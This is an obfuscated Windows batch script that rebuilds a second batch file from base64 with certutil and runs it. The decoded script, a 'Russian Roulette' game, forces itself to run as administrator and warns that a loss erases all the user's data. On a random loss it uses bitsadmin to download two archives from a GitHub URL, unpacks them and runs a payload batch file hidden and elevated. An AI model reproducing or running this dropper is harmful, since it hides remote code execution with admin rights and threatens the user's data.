@echo off

echo QGVjaG8gb2ZmIA0KdGl0bGUgUnVzc2lhbiBSb3VsZXR0ZSBieSBQaG9lbml4dGhy > x.b64
echo dXNoDQpjb2xvciBhDQoNCmlmIG5vdCAiJTEiPT0iYW1fYWRtaW4iIChwb3dlcnNo >> x.b64
echo ZWxsIHN0YXJ0IC12ZXJiIHJ1bmFzICclMCcgYW1fYWRtaW4gJiBleGl0IC9iKQ0K >> x.b64
echo DQpzZXQgL2EgcmFuZD0lcmFuZG9tJSAlJSAyICsgMQ0KDQo6bWVudWUNCmVjaG8g >> x.b64
echo WW91IGhhdmUgYSA1MCBwZXJjZW50IGNoYW5jZSB0byBzdXJ2aXZlIQ0KZWNobyBJ >> x.b64
echo ZiB5b3UgZmFpbCwgYWxsIHlvdXIgZGF0YSB3aWxsIGJlIGxvc3QhDQplY2hvLg0K >> x.b64
echo c2V0IC9wIGFzdz0iRG8geW91IHJlYWxseSB3YW50IHRvIGNvbnRpbnVlPyBbeS9u >> x.b64
echo XSAiDQoNCmlmICVhc3clPT15IChnb3RvIGNvbnRpbnVlKQ0KaWYgJWFzdyU9PW4g >> x.b64
echo KGdvdG8gZXhpdCkgZWxzZSAoZ290byBtZW51ZSkNCmV4aXQNCg0KOmNvbnRpbnVl >> x.b64
echo DQppZiAlcmFuZCU9PTEgKGdvdG8gZnVja2VkKQ0KaWYgJXJhbmQlPT0yIChnb3Rv >> x.b64
echo IGx1Y2spDQpleGl0DQoNCjpmdWNrZWQNCmNscw0KDQpkZWwgJXRlbXAlXHJpY2su >> x.b64
echo bXA0ID4gbnVsDQpiaXRzYWRtaW4gL3RyYW5zZmVyIG15ZG93bmxvYWRqb2IgL2Rv >> x.b64
echo d25sb2FkIC9wcmlvcml0eSBmb3JlZ3JvdW5kICJodHRwczovL3Jhdy5naXRodWJ1 >> x.b64
echo c2VyY29udGVudC5jb20vUGhvZW5peHRocnVzaC9waG9lbml4dGhydXNoLmdpdGh1 >> x.b64
echo Yi5pby9tYXN0ZXIvc2l0ZXMvYXNzZXRzL3JpY2suemlwIiAiJXRlbXAlXHJpY2su >> x.b64
echo emlwIiA+bnVsDQpiaXRzYWRtaW4gL3RyYW5zZmVyIG15ZG93bmxvYWRqb2IgL2Rv >> x.b64
echo d25sb2FkIC9wcmlvcml0eSBmb3JlZ3JvdW5kICJodHRwczovL3Jhdy5naXRodWJ1 >> x.b64
echo c2VyY29udGVudC5jb20vUGhvZW5peHRocnVzaC9waG9lbml4dGhydXNoLmdpdGh1 >> x.b64
echo Yi5pby9tYXN0ZXIvc2l0ZXMvYXNzZXRzLzY2Ni56aXAiICIldGVtcCVcNjY2Lnpp >> x.b64
echo cCIgPm51bA0KcG93ZXJzaGVsbCAtYyAiRXhwYW5kLUFyY2hpdmUgJXRlbXAlXHJp >> x.b64
echo Y2suemlwICV0ZW1wJSINCnBvd2Vyc2hlbGwgLWMgIkV4cGFuZC1BcmNoaXZlICV0 >> x.b64
echo ZW1wJVw2NjYuemlwICV0ZW1wJSINCg0KZGVsICV0ZW1wJVxyaWNrLnppcA0KZGVs >> x.b64
echo ICV0ZW1wJVw2NjYuemlwDQpzdGFydCAiIiAiJXRlbXAlXHJpY2subXA0Ig0KDQo6 >> x.b64
echo bG9vcA0KZm9yIC9GICUleCBJTiAoJ3Rhc2tsaXN0IC9OSCAvRkkgIklNQUdFTkFN >> x.b64
echo RSBlcSBNaWNyb3NvZnQuUGhvdG9zLmV4ZSInKSBETyBJRiAlJXggPT0gTWljcm9z >> x.b64
echo b2Z0LlBob3Rvcy5leGUgZ290byBmb3VuZCBlbHNlDQpwb3dlcnNoZWxsIC1jICJT >> x.b64
echo dGFydC1Qcm9jZXNzIC1WZXJiIFJ1bkFzIC1XaW5kb3dTdHlsZSBoaWRkZW4gJXRl >> x.b64
echo bXAlXDY2Ni5iYXQiDQplY2hvIHlvdXIgZnVja2VkIQ0KdGltZW91dCAzID5udWwN >> x.b64
echo CmV4aXQNCg0KOmZvdW5kDQpnb3RvIGxvb3ANCmV4aXQNCg0KOmx1Y2sNCmNscw0K >> x.b64
echo ZWNobyB5b3Ugc3Vydml2ZWQhDQpwYXVzZSA+bnVsDQpleGl0DQoNCjpleGl0DQpj >> x.b64
echo bHMNCmVjaG8gTWF5YmUgc2VlIHlhIGxhdGVyIQ0KcGF1c2UgPm51bA0KZXhpdA== >> x.b64

certutil -decode "x.b64" "x.bat"
del x.b64
start x.bat